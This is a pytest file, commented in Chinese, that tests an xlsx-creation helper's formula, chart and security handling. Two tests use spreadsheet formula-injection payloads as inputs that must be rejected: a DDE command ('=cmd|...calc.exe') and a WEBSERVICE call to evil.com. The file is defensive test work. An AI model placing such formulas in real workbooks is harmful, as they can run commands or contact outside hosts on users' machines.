# -*- coding: utf-8 -*-
"""tests/test_create.py - 创建 + 公式 + 安全。"""

from __future__ import annotations

import pytest
from openpyxl import load_workbook

from skills.office.xlsx.helpers import create


def test_create_with_formula_sums_correctly(tmp_path):
    """SUM 公式写入后 Excel 计算结果正确。

    openpyxl 不会自己求值，但我们可以验证：
    1. 公式字符串正确写入
    2. 加载后读到 = 起头的字符串
    """
    out = tmp_path / "test_sum.xlsx"
    sheets = {
        "S": [
            ["A", "B"],
            [1, 2],
            [3, 4],
            ["合计", "=SUM(B2:B3)"],  # 应等于 6
        ],
    }
    create.create_xlsx(out, sheets)

    wb = load_workbook(out, data_only=False)
    ws = wb["S"]
    assert ws["B4"].value == "=SUM(B2:B3)"
    assert ws["A4"].value == "合计"
    # 数值原样写入
    assert ws["B2"].value == 2
    assert ws["B3"].value == 4


def test_dangerous_formula_rejected(tmp_path):
    """=cmd|/c calc.exe!A1 这类公式注入直接拒绝。"""
    out = tmp_path / "evil.xlsx"
    sheets = {
        "S": [["payload"], ["=cmd|'/c calc.exe'!A1"]],
    }
    with pytest.raises(ValueError, match="formula injection rejected"):
        create.create_xlsx(out, sheets)


def test_webservice_formula_rejected(tmp_path):
    out = tmp_path / "evil.xlsx"
    with pytest.raises(ValueError, match="formula injection rejected"):
        create.create_xlsx(out, {"S": [["x"], ["=WEBSERVICE(\"http://evil.com\")"]]})


def test_sanitize_external_value_prepends_quote():
    """外部 CSV 字符串以 = 起头时，前置单引号防注入。"""
    assert create.sanitize_external_value("=1+1") == "'=1+1"
    assert create.sanitize_external_value("+CMD") == "'+CMD"
    assert create.sanitize_external_value("@SUM") == "'@SUM"
    # 非危险字符串不变
    assert create.sanitize_external_value("normal text") == "normal text"
    assert create.sanitize_external_value(123) == 123


def test_create_with_chart_attaches_chart(tmp_path):
    out = tmp_path / "chart.xlsx"
    wb = create.create_xlsx(out, {"S": [["x", "y"], ["a", 1], ["b", 2], ["c", 3]]})
    ws = wb["S"]
    create.add_chart(ws, "bar", "A1:B4", anchor="D1", title="t")
    wb.save(out)

    wb2 = load_workbook(out)
    ws2 = wb2["S"]
    # openpyxl 把图表挂在 ws._charts 上
    assert len(ws2._charts) == 1
